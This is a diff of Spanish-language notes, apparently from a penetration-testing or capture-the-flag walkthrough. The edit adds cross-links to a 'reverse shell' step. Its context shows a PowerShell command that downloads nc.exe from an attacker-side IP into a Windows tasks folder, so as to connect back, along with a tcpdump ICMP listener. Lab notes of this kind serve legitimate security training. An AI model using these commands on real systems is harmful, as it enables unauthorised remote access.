@@ -48,7 +48,7 @@ $ sudo tcpdump -i tun0 icmp
 
 # Paso 4: reverse shell
 
-El patrón clásico: descargar `nc.exe` desde nuestra máquina y conectar de vuelta. El comando PowerShell:
+El patrón clásico ([[03 - Reverse shells|reverse shell]]; detalle en [[06 - Shells en Windows|Shells en Windows]]): descargar `nc.exe` desde nuestra máquina y conectar de vuelta. El comando PowerShell:
 
 ```powershell
 (new-object net.webclient).downloadfile("http://10.10.15.2/nc.exe","c:\windows\tasks\nc.exe");
